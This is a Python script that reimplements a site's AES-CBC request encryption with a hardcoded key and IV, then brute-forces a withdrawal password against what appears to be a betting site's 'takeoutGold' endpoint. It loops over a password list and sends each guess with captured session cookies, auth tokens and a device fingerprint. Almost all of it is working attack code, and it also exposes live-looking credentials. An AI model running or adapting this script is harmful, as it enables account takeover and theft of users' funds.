import base64
import hashlib
import time

from Crypto.Cipher import AES, DES
import httpx

class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad: 填充方式
        """
        self.key = key.encode("utf-8")
        # self.data = data
        self.pad = pad.lower()

        hash_obj = hashlib.md5()  # 构造md5对象
        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        """AES-128-CBC解密"""
        # real_data = base64.b64decode(self.data)
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        print(decrypt_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"

import requests

cookies = {
    'session_sslproxy_server': 'c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc',
    'UserKey': 'povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU',
    '_vid_t': '+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
}

headers = {
    'authority': 'www.4424477.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'zh',
    'auth': 'PDVeHfDXg2h2l1OrxN5fPYDUgW0qkH-wRME39zboQgTIaW-xDq_aXC_fxeKd13_uUJo6mJAvrAuW1U3oeOTZvd197qJfRCcRDUvSP_EtuIPLZ3Gv-riYlxf20NWU4fEcNt7O56YMS_m2blJ808pUWqVGj83_FHuQDC4esfXdld8tOB8mzSEhbym4uI4v_dGK-QTvdF-j4lWF27Awcud2CneVJVAITNPV8myns5h6Tbb_GZnyIDWnS6zQhRfgaP2TiKTAkOUazEb5nd_rd7UQGHo_c9s9h5EDNSDajNNkTtwpS-ss1sufNozYPVNh8nJo3fNKrl4T-tUVMK8Lk50-wQ',
    'browserfingerid': 'SWZS2wpfkd0K8ySSUbaa',
    'clienttimezone': 'UTC+8',
    'content-type': 'text/plain',
    # 'cookie': 'session_sslproxy_server=c8b0f2da-77e3-4f05e699d5913eb4aeef7dc31a14acd84bbc; UserKey=povwEaSHnAXR3qwBL6FIyebuXEwjsOXyw9fHuoIoY1ai7TQr3-srLVGdOz6CEmMU; _vid_t=+IFdqGv/k9g+N4uKOWlnRajYlYNaxcIl72dkfDFXwlJZ5LS4nM/XSm+Oct83GD34sNA/txKf2x9slA==',
    'currency': 'CNY',
    'data-uuid': 'data-uuid-42',
    'device': '657c402a-39cf-47ad-bc30-eb96fbcae2b6',
    'devicemodel': 'windows',
    'domain': 'www.4424477.com',
    'language': 'zh',
    'nonce': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
    'origin': 'https://www.4424477.com',
    'platformtype': '5',
    'referer': 'https://www.4424477.com/home/yuebao?id=18538137',
    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sign': '65umdncUL15M+8fESDOTkvmAW1FyTVFFFxouL6NHRolscxXfoU6NSwFJguicMaDL',
    'sitecode': '128',
    'timestamp': '1679233564',
    'token': '4423772043da9659c4dc1679233551632545283',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'x-request-id': 'eec5d2e1-84ab-491e-9fe9-2ce4fa8505e8',
}

# data = 'MeDIyM0Pu+ctTjecfhlFuSv0cUGQ7YkW8L2NC2loE68tCUKPNfAaI0tSEWU7ZgVzw3QIqD55FcMxis7fRbROGA=='

# response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies, headers=headers, data=data)

if __name__ == '__main__':
    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
    # key = "8325b1d23ff2eeb4"
    # iv = "5421698523412578"
    # csss = DeAesCrypt(key, iv)
    # print(data)
    # jiemi = csss.decrypt_aes(data)
    # print(jiemi)
    # jiami = csss.encyrpt_aes(jiemi)
    # print(jiami)
    # aes_obj = DeAesCrypt(key, iv)
    # content = ""
    # data = aes_obj.encyrpt_aes(content)
    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
    # response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
    # print(response.json())
    # key = "8325b1d23ff2eeb4"
    key = "6ac7977dbcc1d526"
    iv = "5421698523412578"
    aes_obj = DeAesCrypt(key, iv)
    with open("pass.txt", "r") as f:
        for content in f.readlines():
            try:
                data = aes_obj.encyrpt_aes(content)
                # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
                # response = requests.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)
                response = httpx.post('https://www.4424477.com/hall/yuebao/takeoutGold', cookies=cookies,headers=headers, data=data)

                res = response.json()
                if "密码不正确" == res.get("msg") or res.get("errorCode")==41080:
                    pass
                else:
                    print(content, res,data)
                    break
            except Exception as e:
                print(e.__traceback__.tb_frame.f_globals["__file__"],e.__traceback__.tb_frame.f_lineno)
                print(str(e),"到那了:",content,data)
                time.sleep(5)
                continue